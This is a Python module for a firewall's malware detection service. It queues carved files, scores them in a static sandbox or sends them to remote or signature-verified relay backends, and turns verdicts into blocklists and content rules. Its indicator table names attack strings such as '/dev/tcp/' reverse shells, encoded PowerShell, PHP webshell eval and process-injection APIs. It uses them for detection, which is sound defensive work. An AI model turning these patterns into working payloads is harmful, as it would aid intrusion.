#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
"""
cloud_det.py -- FFN NGFW unknown-object detection service (CRUCIBLE).

The "unknown-threat" half of the detection stack. Where inline_payload_det.py
enforces what is already known at line rate, this system takes the UNKNOWN
objects the inline engine carves out of flows, detonates/analyses them, and
turns a verdict into new enforceable content -- closing the Crucible loop:

    inline_payload_det.carve_files()        (unknown PE / PDF / script / ...)
                 |
                 v
      CloudDetectionService.submit()        dedup vs ThreatDB verdict cache
                 |                           persistent submission queue
                 v
          CloudBackend.analyze()            LocalSandbox (offline static) OR
                 |                           HttpCloudBackend (real REST cloud)
                 v
             SandboxReport                  verdict + score + generated sigs/IOCs
                 |
     +-----------+-----------------------------+
     |                        |                 |
  ThreatDB.record_sample   ThreatDB.record_ioc  InlinePayloadDetector.add_signature
  (hash blocklist)         (C2 domains/ips)      (behavioural content sigs)
     |                        |                 |
     +-----------> InlinePayloadDetector.compile_to_fpga() -> hardware fast path

So the *next* time the same file (by hash), a variant (by behavioural string),
or its C2 infrastructure (by IOC) appears, the inline engine blocks it -- in
software immediately and in the FPGA after the compile push.

Design:
  * Pluggable backend. LocalSandbox is a dependency-free static-analysis
    "sandbox" (file-magic, entropy/packing, embedded IOCs, behavioural string
    rules) that is fully deterministic and offline -- so the whole loop is
    unit-testable with no network. HttpCloudBackend speaks a generic
    submit/verdict REST API (stdlib urllib) for a real cloud when configured.
  * Verdict cache with TTL in ThreatDB + a cloud_reports table; a re-submit of
    a known sample is answered from cache, not re-detonated.
  * Sample bytes are spooled in a bounded cloud_queue row (BLOB) so pending
    work survives a restart; oversized objects are truncated for analysis.
  * `--selftest` proves the closed loop with no hardware and no network.

CLI:
    cloud_det.py selftest
    cloud_det.py submit <file>
    cloud_det.py process [--limit N]
    cloud_det.py verdict <sha256>
    cloud_det.py report <sha256>
    cloud_det.py stats
"""

import argparse
import hashlib
import json
import logging
import os
import re
import sqlite3
import sys
import threading
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

try:
    from ffn_threatdb import ThreatDB, VERDICT_SCORE, VERDICT_ACTION, ACTION_ALERT
except Exception:
    ThreatDB = None
    VERDICT_SCORE = {"unknown": 0, "benign": 0, "grayware": 40,
                     "phishing": 80, "malware": 100}
    ACTION_ALERT = 0

from inline_payload_det import (
    InlinePayloadDetector, ContentSignature, detect_file_type, shannon_entropy,
    extract_iocs, seed_baseline, ACTION_DROP, ACTION_RESET,
)

logger = logging.getLogger("ffn-cloud-det")

# Generated-signature SID range: keep well clear of builtin (1000..) and manual
# ranges so cloud sig-gen never clobbers a hand-authored rule.
GENERATED_SID_BASE = 5_000_000
# Max object we will spool/analyse inline (bytes). Larger files are truncated
# for static features (a real sandbox would stream the whole file).
MAX_SPOOL = 32 * 1024 * 1024


# ===========================================================================
# Report model
# ===========================================================================
@dataclass
class SandboxReport:
    """Structured verdict returned by a CloudBackend for one sample."""
    sha256: str
    verdict: str = "unknown"                     # verdict taxonomy
    score: int = 0
    threat_name: str = ""
    file_type: Optional[str] = None
    signatures: List[ContentSignature] = field(default_factory=list)
    iocs: List[Tuple[str, str, str, str]] = field(default_factory=list)  # (type,value,verdict,name)
    details: Dict = field(default_factory=dict)
    backend: str = "local"
    analyzed: float = 0.0

    def to_json(self) -> str:
        return json.dumps({
            "sha256": self.sha256, "verdict": self.verdict, "score": self.score,
            "threat_name": self.threat_name, "file_type": self.file_type,
            "signatures": [{"name": s.name, "pattern_hex": s.pattern.hex(),
                            "action": s.action, "severity": s.severity} for s in self.signatures],
            "iocs": [{"type": t, "value": v, "verdict": vd, "name": nm}
                     for (t, v, vd, nm) in self.iocs],
            "details": self.details, "backend": self.backend,
        }, sort_keys=True)


# ===========================================================================
# Backend interface + implementations
# ===========================================================================
class CloudBackend:
    """Abstract analysis backend. analyze() must be deterministic for a hash."""

    name = "abstract"

    def analyze(self, sha256: str, data: bytes, meta: dict) -> SandboxReport:
        raise NotImplementedError


class LocalSandbox(CloudBackend):
    """Offline static-analysis reference sandbox (no network, deterministic).

    Not a full detonation engine -- it scores a sample from file type, entropy
    (packing), embedded network IOCs, and a table of behavioural / capability
    strings, then synthesises the verdict + the enforceable signatures a real
    cloud would return. Good enough to (a) run the whole loop in CI and (b)
    serve as the on-box fallback when the cloud is unreachable.
    """

    name = "local"

    # (indicator bytes, weight, threat class, human name). Weight ~ how strongly
    # this capability implies malware. Kept lowercase; matched case-folded.
    INDICATORS: List[Tuple[bytes, int, str, str]] = [
        (b"createremotethread",   60, "malware",  "Behavior.ProcessInjection"),
        (b"virtualallocex",       45, "malware",  "Behavior.RemoteAlloc"),
        (b"writeprocessmemory",   45, "malware",  "Behavior.ProcessInjection"),
        (b"setwindowshookex",     35, "malware",  "Behavior.Hook"),
        (b"urldownloadtofile",    50, "malware",  "Behavior.Downloader"),
        (b"wscript.shell",        40, "malware",  "Behavior.ScriptExec"),
        (b"powershell -enc",      55, "malware",  "Downloader.PowerShell"),
        (b"frombase64string",     30, "grayware", "Obfuscation.Base64"),
        (b"cmd.exe /c",           25, "grayware", "Behavior.Shell"),
        (b"/dev/tcp/",            60, "malware",  "Backdoor.ReverseShell"),
        (b"eval(base64_decode",   60, "malware",  "Webshell.PHP"),
        (b"schtasks /create",     35, "grayware", "Persistence.ScheduledTask"),
        (b"reg add",              15, "grayware", "Persistence.Registry"),
        # the canonical AV test string -> always malware
        (b"eicar-standard-antivirus-test-file", 100, "malware", "EICAR.Test"),
    ]

    def analyze(self, sha256: str, data: bytes, meta: dict) -> SandboxReport:
        blob = data[:MAX_SPOOL]
        low = blob.lower()
        ftype = detect_file_type(blob) or (meta.get("file_type") if meta else None)
        ent = shannon_entropy(blob[:65536])

        score = 0
        threats: List[str] = []
        matched: List[Tuple[bytes, int, str, str]] = []
        for ind, w, cls, name in self.INDICATORS:
            if ind in low:
                score += w
                threats.append(name)
                matched.append((ind, w, cls, name))

        # packing heuristic: high-entropy executable body is suspicious
        if ftype in ("pe", "elf", "macho") and ent >= 7.2:
            score += 20
            threats.append("Packer.HighEntropy")

        # embedded network IOCs raise score + become blockable indicators
        iocs_found = extract_iocs(blob)
        ioc_rows: List[Tuple[str, str, str, str]] = []
        for t in ("url", "domain", "ip"):
            for v in iocs_found.get(t, [])[:16]:
                # only treat as malicious IOC if the sample already looks bad;
                # otherwise record as unknown (observed, not condemned).
                ioc_rows.append((t, v, "unknown", "Observed.%s" % t))
        if score >= 60 and ioc_rows:
            score += 15
            ioc_rows = [(t, v, "malware", "C2.FromSample") for (t, v, _vd, _n) in ioc_rows]

        verdict = ("malware" if score >= 60 else
                   "grayware" if score >= 25 else
                   "benign")
        threat_name = threats[0] if threats else ("Suspicious.Generic"
                                                  if verdict != "benign" else "")

        # Generated behavioural signatures: the highest-weight distinctive
        # indicators become inline content rules so *variants* (new hash, same
        # capability) are caught next time. Skip weak/short tokens to limit FP.
        sigs: List[ContentSignature] = []
        if verdict == "malware":
            for ind, w, cls, name in sorted(matched, key=lambda x: -x[1])[:3]:
                if w < 40 or len(ind) < 8:
                    continue
                sigs.append(ContentSignature(
                    sid=0,  # assigned by the service
                    name="cloudgen.%s" % name,
                    pattern=ind, nocase=True,
                    action=VERDICT_ACTION.get(cls, ACTION_RESET),
                    severity="high", threat_name=name, verdict=cls,
                    source="cloudgen"))

        return SandboxReport(
            sha256=sha256, verdict=verdict, score=min(score, 100),
            threat_name=threat_name, file_type=ftype,
            signatures=sigs, iocs=ioc_rows,
            details={"entropy": round(ent, 3), "size": len(data),
                     "indicators": [n for (_i, _w, _c, n) in matched]},
            backend=self.name, analyzed=meta.get("_now", 0.0) if meta else 0.0)


class HttpCloudBackend(CloudBackend):
    """Generic third-party REST cloud backend (stdlib urllib).

    Protocol (configurable; the shape most public sandbox APIs use):
      POST {base}/submit        (multipart file)   -> {"sha256":..,"ticket":..}
      GET  {base}/verdict/<sha> (apikey header)     -> {"verdict":..,"score":..,
                                                        "threat":..,"signatures":[..],
                                                        "iocs":[..]}
    Used only when a base_url is configured; never exercised by the offline
    selftest. Network/parse failures degrade to an 'unknown' report (fail open
    for availability; the inline engine still enforces known content).
    """

    name = "http"

    def __init__(self, base_url: str, api_key: str = "", *, timeout: float = 20.0):
        self.base_url = base_url.rstrip("/")
        self.api_key = api_key
        self.timeout = timeout

    def analyze(self, sha256: str, data: bytes, meta: dict) -> SandboxReport:
        import urllib.request
        import urllib.error
        hdrs = {"X-API-KEY": self.api_key, "Content-Type": "application/octet-stream"}
        try:
            # submit
            req = urllib.request.Request(self.base_url + "/submit", data=data,
                                         headers=hdrs, method="POST")
            urllib.request.urlopen(req, timeout=self.timeout).read()
            # verdict (a real client would poll until analysis completes)
            vreq = urllib.request.Request(
                "%s/verdict/%s" % (self.base_url, sha256),
                headers={"X-API-KEY": self.api_key})
            body = urllib.request.urlopen(vreq, timeout=self.timeout).read()
            j = json.loads(body.decode("utf-8", "ignore"))
        except (urllib.error.URLError, OSError, ValueError) as e:
            logger.warning("cloud backend unreachable (%s); verdict=unknown", e)
            return SandboxReport(sha256=sha256, verdict="unknown", backend=self.name)

        verdict = j.get("verdict", "unknown")
        sigs = []
        for s in j.get("signatures", []):
            try:
                sigs.append(ContentSignature(
                    sid=0, name=s.get("name", "cloudgen"),
                    pattern=bytes.fromhex(s["pattern_hex"]), nocase=True,
                    action=int(s.get("action", ACTION_RESET)),
                    severity=s.get("severity", "high"),
                    threat_name=s.get("name", ""), verdict=verdict, source="cloudgen"))
            except Exception:
                continue
        iocs = [(i.get("type"), i.get("value"), i.get("verdict", verdict),
                 i.get("name", "")) for i in j.get("iocs", []) if i.get("value")]
        return SandboxReport(
            sha256=sha256, verdict=verdict, score=int(j.get("score", 0)),
            threat_name=j.get("threat", ""), file_type=j.get("file_type"),
            signatures=sigs, iocs=iocs, details=j.get("details", {}),
            backend=self.name)


# ===========================================================================
# RelayBackend -- offload to a Crucible analysis node
# ===========================================================================
class RelayBackend(CloudBackend):
    """Submit to an ffn_crucible_node and collect a SIGNED verdict.

    This is the offload path. The firewall carves the object and hands it to a
    node that owns the guests; the node detonates and returns a verdict plus
    the content needed to enforce it.

    THE SIGNATURE CHECK IS THE POINT
        A returned verdict makes this firewall blocklist a hash, condemn a
        domain and install a DROP rule that is pushed into the FPGA fast path.
        Anyone able to forge one could therefore clear a sample they want
        delivered, or blocklist a domain they want taken down -- a denial of
        service authored by an attacker and executed by our own hardware. So a
        verdict is only acted on when its ed25519 signature verifies against
        the configured node key.

        `require_signed` defaults to True BECAUSE the failure mode of the
        alternative is silent. With no key configured the backend still works,
        but every verdict comes back `unknown` and says why, which is loud.

    FAILURE IS 'UNKNOWN', NEVER 'BENIGN'
        A node that is unreachable, slow, or unverifiable yields `unknown`. That
        keeps the sample queued for a later attempt and leaves the inline engine
        enforcing what it already knows. Returning `benign` on an error would
        cache a clean verdict for a week for a file nobody ever looked at.
    """

    name = "relay"

    def __init__(self, base_url: str, *, token: str = "",
                 token_file: str = "", pubkey: bytes = b"",
                 pubkey_file: str = "", require_signed: bool = True,
                 timeout: float = 20.0, poll_deadline: float = 180.0,
                 poll_interval: float = 2.0):
        self.base_url = base_url.rstrip("/")
        self.require_signed = require_signed
        self.timeout = timeout
        self.poll_deadline = poll_deadline
        self.poll_interval = poll_interval
        self._token = token or self._read_text(token_file)
        self._pubkey = pubkey or self._read_hex(pubkey_file)
        self.last_error = ""

    # -- credentials -------------------------------------------------------
    @staticmethod
    def _read_text(path: str) -> str:
        if not path:
            return ""
        try:
            with open(path) as fh:
                return fh.read().strip()
        except OSError as e:
            logger.warning("relay token file %s unreadable: %s", path, e)
            return ""

    @staticmethod
    def _read_hex(path: str) -> bytes:
        if not path:
            return b""
        try:
            with open(path) as fh:
                raw = fh.read().strip()
            val = bytes.fromhex(raw)
        except (OSError, ValueError) as e:
            logger.warning("relay pubkey %s unusable: %s", path, e)
            return b""
        if len(val) != 32:
            logger.warning("relay pubkey %s is %d bytes, expected 32",
                           path, len(val))
            return b""
        return val

    def _headers(self, extra: Optional[dict] = None) -> dict:
        h = dict(extra or {})
        if self._token:
            h["Authorization"] = "Bearer " + self._token
        return h

    # -- protocol ----------------------------------------------------------
    def _post_sample(self, data: bytes, meta: dict) -> dict:
        import urllib.request
        hdrs = self._headers({
            "Content-Type": "application/octet-stream",
            "X-Crucible-Filename": str(meta.get("filename", ""))[:128],
            "X-Crucible-Meta": json.dumps(
                {k: str(v)[:256] for k, v in list(meta.items())[:24]
                 if not k.startswith("_")})[:4096],
        })
        req = urllib.request.Request(self.base_url + "/submit", data=data,
                                     headers=hdrs, method="POST")
        with urllib.request.urlopen(req, timeout=self.timeout) as r:
            return json.loads(r.read().decode("utf-8", "replace") or "{}")

    def _get_verdict(self, sha: str) -> Optional[dict]:
        """One poll. None means 'not known to the node'."""
        import urllib.error
        import urllib.request
        req = urllib.request.Request("%s/verdict/%s" % (self.base_url, sha),
                                     headers=self._headers(), method="GET")
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                return json.loads(r.read().decode("utf-8", "replace") or "{}")
        except urllib.error.HTTPError as e:
            if e.code == 404:
                return None
            raise

    def node_pubkey(self) -> bytes:
        """Fetch the node's advertised key. NOT trusted for verification.

        Offered for provisioning and for telling an operator that their pinned
        key does not match the node they are talking to. Verifying a signature
        with a key handed over by the same channel that delivered the signature
        proves nothing.
        """
        import urllib.request
        try:
            req = urllib.request.Request(self.base_url + "/api/pubkey",
                                         method="GET")
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                doc = json.loads(r.read().decode("utf-8", "replace") or "{}")
            return bytes.fromhex(doc.get("pubkey", ""))
        except Exception:
            return b""

    # -- the CloudBackend interface ----------------------------------------
    def analyze(self, sha256: str, data: bytes, meta: dict) -> SandboxReport:
        import urllib.error
        self.last_error = ""

        def unknown(why: str) -> SandboxReport:
            self.last_error = why
            logger.warning("relay %s: %s", self.base_url, why)
            return SandboxReport(sha256=sha256, verdict="unknown",
                                 backend=self.name,
                                 details={"relay": self.base_url, "error": why})

        try:
            posted = self._post_sample(data, meta or {})
        except (urllib.error.URLError, OSError, ValueError) as e:
            return unknown("submission failed: %s" % e)
        if posted.get("status") == "rejected":
            return unknown("node rejected the sample: %s"
                           % posted.get("error", "no reason given"))

        deadline = time.time() + self.poll_deadline
        bundle: Optional[dict] = None
        interval = self.poll_interval
        while time.time() < deadline:
            try:
                got = self._get_verdict(sha256)
            except (urllib.error.URLError, OSError, ValueError) as e:
                return unknown("verdict poll failed: %s" % e)
            if got is None:
                return unknown("node does not know this sample after accepting it")
            status = got.get("status")
            if status == "done":
                bundle = got
                break
            if status in ("error", "invalid"):
                return unknown("node reported %s: %s"
                               % (status, got.get("error", "")))
            time.sleep(min(interval, max(0.0, deadline - time.time())))
            interval = min(interval * 1.5, 15.0)
        if bundle is None:
            return unknown("no verdict within %.0fs" % self.poll_deadline)

        # -- authenticate the verdict before acting on any part of it ------
        if self._pubkey:
            if not self._verify(bundle):
                return unknown("verdict signature did not verify (key_id=%s)"
                               % bundle.get("key_id", ""))
        elif self.require_signed:
            return unknown("no node public key configured and require_signed "
                           "is set; refusing to act on an unauthenticated "
                           "verdict")
        else:
            logger.warning("relay %s: acting on an UNVERIFIED verdict for %s "
                           "(no pubkey configured)", self.base_url, sha256[:12])

        return self._to_report(sha256, bundle)

    def _verify(self, bundle: dict) -> bool:
        """Check the bundle against the PINNED node key.

        The canonical form is defined once, in ffn_crucible.VerdictSigner, and
        both ends import that same definition -- a second implementation here
        would be a second thing to keep in step, and a divergence would present
        as "every verdict fails to verify" or, far worse, as a signature that
        covers fewer fields than the verifier believes.
        """
        try:
            from ffn_crucible import VerdictSigner
        except ImportError as e:
            logger.error("cannot verify relay verdicts: ffn_crucible is not "
                         "deployed (%s)", e)
            return False
        return VerdictSigner.verify(bundle, self._pubkey)

    def _to_report(self, sha256: str, bundle: dict) -> SandboxReport:
        """Convert a signed bundle into a SandboxReport.

        Every field is re-validated rather than trusted: the signature proves
        the node authored the bundle, not that the bundle is well-formed, and a
        malformed action or pattern would otherwise reach the rule compiler.
        """
        sigs: List[ContentSignature] = []
        for entry in bundle.get("signatures", [])[:64]:
            try:
                pattern = bytes.fromhex(entry.get("pattern_hex", ""))
            except ValueError:
                continue
            if not (1 <= len(pattern) <= 1024):
                continue
            action = entry.get("action", ACTION_RESET)
            try:
                action = int(action)
            except (TypeError, ValueError):
                action = ACTION_RESET
            if action not in (ACTION_ALERT, ACTION_DROP, ACTION_RESET):
                action = ACTION_RESET
            sigs.append(ContentSignature(
                sid=0, name=str(entry.get("name", "crucible"))[:96],
                pattern=pattern, nocase=True, action=action,
                severity=str(entry.get("severity", "high"))[:12],
                threat_name=str(entry.get("name", ""))[:96],
                verdict=bundle.get("verdict", "malware"), source="crucible"))

        iocs: List[Tuple[str, str, str, str]] = []
        for entry in bundle.get("iocs", [])[:256]:
            ioc_type = str(entry.get("type", ""))[:16]
            value = str(entry.get("value", ""))[:512]
            if ioc_type not in ("domain", "dns", "url", "ip", "tlsfp") or not value:
                continue
            iocs.append((ioc_type, value,
                         str(entry.get("verdict", "unknown"))[:16],
                         str(entry.get("name", ""))[:96]))

        verdict = str(bundle.get("verdict", "unknown"))
        if verdict not in VERDICT_SCORE:
            verdict = "unknown"
        try:
            score = max(0, min(100, int(bundle.get("score", 0) or 0)))
        except (TypeError, ValueError):
            score = 0
        details = dict(bundle.get("details") or {})
        details.update({"relay": self.base_url, "node": bundle.get("node", ""),
                        "key_id": bundle.get("key_id", ""),
                        "verified": bool(self._pubkey)})
        return SandboxReport(
            sha256=sha256, verdict=verdict, score=score,
            threat_name=str(bundle.get("threat", ""))[:96],
            file_type=(bundle.get("file_type") or None),
            signatures=sigs, iocs=iocs, details=details,
            backend=self.name, analyzed=time.time())

# ===========================================================================
# Backend composition
# ===========================================================================
class FallbackBackend(CloudBackend):
    """Try the primary; on `unknown`, fall back to the secondary.

    This is what makes offload safe to depend on. When the analysis node is
    unreachable the firewall keeps inspecting -- at lower fidelity, and saying
    so in the report -- instead of stopping. An outage degrades the verdict
    rather than removing it.

    Only `unknown` triggers the fallback. A node that says `benign` has looked
    at the sample in a guest and is better informed than anything we can do on
    the firewall, so second-guessing it locally would make the answer worse.
    """

    name = "fallback"

    def __init__(self, primary: CloudBackend, secondary: CloudBackend):
        self.primary = primary
        self.secondary = secondary
        self.name = "%s+%s" % (primary.name, secondary.name)

    def analyze(self, sha256: str, data: bytes, meta: dict) -> SandboxReport:
        rep = self.primary.analyze(sha256, data, meta)
        if rep.verdict != "unknown":
            return rep
        why = rep.details.get("error", "primary returned unknown")
        logger.info("falling back to %s for %s (%s)",
                    self.secondary.name, sha256[:12], why)
        alt = self.secondary.analyze(sha256, data, meta)
        alt.details = dict(alt.details or {})
        alt.details["fell_back_from"] = self.primary.name
        alt.details["fallback_reason"] = why
        alt.backend = "%s(after %s)" % (alt.backend, self.primary.name)
        return alt


def local_backend(policy: str = "static", *, timeout: int = 30,
                  guest_profiles: str = "") -> CloudBackend:
    """The on-box engine, or the legacy static sandbox if it is absent.

    Imported lazily: ffn_crucible resolves the report class from THIS module,
    so a module-level import here would be a cycle.
    """
    try:
        from ffn_crucible import CrucibleSandbox, DEFAULT_GUEST_PROFILES
    except ImportError as e:
        logger.warning("ffn_crucible unavailable (%s); using the legacy "
                       "static sandbox", e)
        return LocalSandbox()
    return CrucibleSandbox(policy=policy, timeout=timeout,
                           guest_profiles=guest_profiles or DEFAULT_GUEST_PROFILES,
                           report_cls=SandboxReport)


def build_backend(spec: str, *, token_file: str = "", pubkey_file: str = "",
                  require_signed: bool = True, policy: str = "static",
                  timeout: int = 30, guest_profiles: str = "",
                  api_key: str = "") -> CloudBackend:
    """Turn one configuration string into a backend.

        local                     on-box engine at the given --policy
        legacy                    the original string-and-entropy sandbox
        relay:<url>               offload only; an outage means no verdict
        relay+local:<url>         offload, falling back to on-box  [recommended]
        http:<url>                a foreign REST cloud (HttpCloudBackend)

    One string covers every deployment shape in the docstring at the top of
    this file, so switching a fleet from on-box to offload is a config change
    and not a code change.
    """
    spec = (spec or "local").strip()
    # A bare URL is the friendly reading of "http://host/..." -- without this,
    # partition(":") would take the scheme as the kind and "//host/..." as the
    # argument, yielding a backend pointed at a URL that cannot resolve.
    if spec.startswith(("http://", "https://")):
        spec = "http:" + spec
    kind, _, arg = spec.partition(":")
    kind = kind.lower()

    if kind in ("local", ""):
        return local_backend(policy, timeout=timeout,
                             guest_profiles=guest_profiles)
    if kind == "legacy":
        return LocalSandbox()
    if kind == "http":
        return HttpCloudBackend(arg, api_key)
    if kind in ("relay", "relay+local"):
        if not arg:
            raise ValueError("%s needs a URL, e.g. relay:https://node:8449" % kind)
        relay = RelayBackend(arg, token_file=token_file,
                             pubkey_file=pubkey_file,
                             require_signed=require_signed, timeout=timeout)
        if kind == "relay":
            return relay
        return FallbackBackend(relay, local_backend(
            policy, timeout=timeout, guest_profiles=guest_profiles))
    raise ValueError("unknown backend spec %r" % spec)


# ===========================================================================
# The service
# ===========================================================================
class CloudDetectionService:
    """Queue + dedup + verdict-cache + feedback wiring around a CloudBackend."""

    SCHEMA = """
    CREATE TABLE IF NOT EXISTS cloud_queue (
        sha256    TEXT PRIMARY KEY,
        status    TEXT NOT NULL DEFAULT 'pending',   -- pending/analyzing/done/error
        file_type TEXT,
        size      INTEGER,
        meta      TEXT,
        sample    BLOB,
        submitted TEXT,
        updated   TEXT,
        attempts  INTEGER NOT NULL DEFAULT 0
    );
    CREATE TABLE IF NOT EXISTS cloud_reports (
        sha256      TEXT PRIMARY KEY,
        verdict     TEXT NOT NULL,
        score       INTEGER NOT NULL DEFAULT 0,
        threat_name TEXT,
        file_type   TEXT,
        backend     TEXT,
        report      TEXT,
        analyzed    TEXT
    );
    """

    def __init__(self, threatdb: "ThreatDB", inline: Optional[InlinePayloadDetector] = None,
                 backend: Optional[CloudBackend] = None, *, cache_ttl: int = 7 * 24 * 3600,
                 auto_compile: bool = False):
        if threatdb is None:
            raise ValueError("CloudDetectionService requires a ThreatDB")
        self.threatdb = threatdb
        self.inline = inline
        self.backend = backend or LocalSandbox()
        self.cache_ttl = cache_ttl
        self.auto_compile = auto_compile
        self.stats = {"submitted": 0, "deduped": 0, "analyzed": 0,
                      "malware": 0, "grayware": 0, "benign": 0,
                      "sigs_generated": 0, "iocs_recorded": 0, "errors": 0}
        # Guards our own multi-statement work (the claim transaction, and the
        # report write that follows an analysis) against the other thread.
        self._lock = threading.RLock()
        self.threatdb.conn.executescript(self.SCHEMA)
        self.threatdb.conn.commit()

    # -- submission --------------------------------------------------------
    def submit(self, data: bytes, meta: Optional[dict] = None) -> dict:
        """Queue an object for analysis. Returns {sha256, status, verdict?}.

        Dedup: if we already hold a fresh verdict for this hash (in ThreatDB
        samples or cloud_reports within cache_ttl) we return it immediately and
        do NOT re-detonate.
        """
        meta = dict(meta or {})
        sha = hashlib.sha256(data).hexdigest()
        self.stats["submitted"] += 1
        with self._lock:
            return self._submit_locked(sha, data, meta)

    def _submit_locked(self, sha: str, data: bytes, meta: dict) -> dict:
        cached = self._cached_verdict(sha)
        if cached is not None:
            self.stats["deduped"] += 1
            return {"sha256": sha, "status": "cached", "verdict": cached}

        now = self._now()
        row = self.threatdb.conn.execute(
            "SELECT status FROM cloud_queue WHERE sha256=?", (sha,)).fetchone()
        if row and row["status"] in ("pending", "analyzing"):
            return {"sha256": sha, "status": row["status"]}

        ftype = detect_file_type(data) or meta.get("file_type")
        self.threatdb.conn.execute(
            """INSERT INTO cloud_queue (sha256,status,file_type,size,meta,sample,submitted,updated)
               VALUES (?,?,?,?,?,?,?,?)
               ON CONFLICT(sha256) DO UPDATE SET status='pending', updated=excluded.updated""",
            (sha, "pending", ftype, len(data), json.dumps(meta),
             data[:MAX_SPOOL], now, now))
        self.threatdb.conn.commit()
        return {"sha256": sha, "status": "queued"}

    def _cached_verdict(self, sha: str) -> Optional[str]:
        # definitive sample verdict wins
        samp = self.threatdb.lookup_sample(sha)
        if samp and samp["verdict"] in ("malware", "phishing", "benign", "grayware"):
            return samp["verdict"]
        # else a fresh cloud report
        r = self.threatdb.conn.execute(
            "SELECT verdict,analyzed FROM cloud_reports WHERE sha256=?", (sha,)).fetchone()
        if r and r["verdict"] != "unknown":
            if self._fresh(r["analyzed"]):
                return r["verdict"]
        return None

    def _fresh(self, ts: str) -> bool:
        try:
            t = time.mktime(time.strptime(ts, "%Y-%m-%dT%H:%M:%SZ"))
        except Exception:
            return False
        return (time.time() - t) < self.cache_ttl

    # -- processing --------------------------------------------------------
    def process_pending(self, limit: int = 50) -> List[SandboxReport]:
        """Analyse queued samples, record verdicts, and feed back the results."""
        # Claim atomically. BEGIN IMMEDIATE takes the write lock before the
        # SELECT, so a second drainer -- the daemon and an operator running
        # `process` by hand, say -- cannot claim the same rows and detonate
        # the same sample twice.
        conn = self.threatdb.conn
        try:
            with self._lock:
                conn.execute("BEGIN IMMEDIATE")
                rows = conn.execute(
                    "SELECT sha256,sample,meta,file_type FROM cloud_queue "
                    "WHERE status='pending' ORDER BY submitted LIMIT ?",
                    (limit,)).fetchall()
                if rows:
                    conn.executemany(
                        "UPDATE cloud_queue SET status='analyzing', updated=?, "
                        "attempts=attempts+1 WHERE sha256=?",
                        [(self._now(), r["sha256"]) for r in rows])
                conn.commit()
        except sqlite3.Error as e:
            logger.warning("could not claim queued samples: %s", e)
            try:
                conn.rollback()
            except sqlite3.Error:
                pass
            return []
        reports = []
        for r in rows:
            sha = r["sha256"]
            try:
                meta = json.loads(r["meta"] or "{}")
                meta["_now"] = time.time()
                rep = self.backend.analyze(sha, bytes(r["sample"] or b""), meta)
                self._apply_report(rep)
                self._set_status(sha, "done")
                reports.append(rep)
                self.stats["analyzed"] += 1
                self.stats[rep.verdict if rep.verdict in self.stats else "benign"] = \
                    self.stats.get(rep.verdict, 0) + 1
            except Exception as e:
                logger.exception("analysis failed for %s: %s", sha, e)
                self.stats["errors"] += 1
                self.threatdb.conn.execute(
                    "UPDATE cloud_queue SET status='error', attempts=attempts+1, updated=? "
                    "WHERE sha256=?", (self._now(), sha))
                self.threatdb.conn.commit()
        if reports and self.auto_compile and self.inline is not None:
            try:
                self.inline.compile_to_fpga()
            except Exception as e:
                logger.warning("auto compile_to_fpga failed: %s", e)
        return reports

    def _apply_report(self, rep: SandboxReport) -> None:
        """Persist the verdict + wire generated content back into enforcement."""
        with self._lock:
            self._apply_report_locked(rep)

    def _apply_report_locked(self, rep: SandboxReport) -> None:
        now = self._now()
        rep.analyzed = time.time()
        self.threatdb.conn.execute(
            """INSERT INTO cloud_reports (sha256,verdict,score,threat_name,file_type,
                   backend,report,analyzed) VALUES (?,?,?,?,?,?,?,?)
               ON CONFLICT(sha256) DO UPDATE SET verdict=excluded.verdict,
                   score=excluded.score, threat_name=excluded.threat_name,
                   file_type=excluded.file_type, backend=excluded.backend,
                   report=excluded.report, analyzed=excluded.analyzed""",
            (rep.sha256, rep.verdict, rep.score, rep.threat_name, rep.file_type,
             rep.backend, rep.to_json(), now))

        # 1) file-hash verdict -> ThreatDB samples (hash blocklist next time)
        if rep.verdict in ("malware", "phishing", "grayware", "benign"):
            self.threatdb.record_sample(
                rep.sha256, rep.verdict, file_type=rep.file_type,
                threat_name=rep.threat_name or None, source="cloud")

        # 2) behavioural signatures -> inline content rules (variant coverage)
        if rep.signatures and self.inline is not None:
            for sig in rep.signatures:
                sig.sid = self._alloc_sid()
                try:
                    self.inline.add_signature(sig, persist=True)
                    self.stats["sigs_generated"] += 1
                except Exception as e:
                    logger.debug("sig add failed: %s", e)

        # 3) embedded IOCs -> ThreatDB iocs (C2 infra coverage)
        for (ioc_type, value, verdict, name) in rep.iocs:
            if verdict in ("benign", "unknown"):
                continue
            try:
                self.threatdb.record_ioc(ioc_type, value, verdict,
                                         threat_name=name, source="cloud")
                self.stats["iocs_recorded"] += 1
            except Exception as e:
                logger.debug("ioc record failed: %s", e)

        self.threatdb.conn.commit()

    def _alloc_sid(self) -> int:
        row = self.threatdb.conn.execute(
            "SELECT MAX(sid) m FROM content_signatures WHERE sid>=?",
            (GENERATED_SID_BASE,)).fetchone()
        return (row["m"] + 1) if row and row["m"] else GENERATED_SID_BASE

    def _set_status(self, sha: str, status: str) -> None:
        with self._lock:
            self._set_status_locked(sha, status)

    def _set_status_locked(self, sha: str, status: str) -> None:
        self.threatdb.conn.execute(
            "UPDATE cloud_queue SET status=?, updated=?, attempts=attempts+1 WHERE sha256=?",
            (status, self._now(), sha))
        self.threatdb.conn.commit()

    # -- queries -----------------------------------------------------------
    def verdict(self, sha256: str) -> dict:
        sha = sha256.lower().strip()
        v = self._cached_verdict(sha)
        r = self.threatdb.conn.execute(
            "SELECT * FROM cloud_reports WHERE sha256=?", (sha,)).fetchone()
        return {"sha256": sha, "verdict": v or "unknown",
                "report": dict(r) if r else None}

    def get_report(self, sha256: str) -> Optional[dict]:
        r = self.threatdb.conn.execute(
            "SELECT report FROM cloud_reports WHERE sha256=?",
            (sha256.lower().strip(),)).fetchone()
        return json.loads(r["report"]) if r and r["report"] else None

    def queue_depth(self) -> int:
        return self.threatdb.conn.execute(
            "SELECT COUNT(*) c FROM cloud_queue WHERE status='pending'").fetchone()["c"]

    @staticmethod
    def _now() -> str:
        return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())

    def summary_stats(self) -> dict:
        s = dict(self.stats)
        s["queue_depth"] = self.queue_depth()
        s["backend"] = self.backend.name
        return s


# ===========================================================================
# QueueDrainer -- the thread that turns a submission into a verdict
# ===========================================================================
class QueueDrainer:
    """Background loop over CloudDetectionService.process_pending().

    Runs exactly one instance per appliance. The queue is shared sqlite, so a
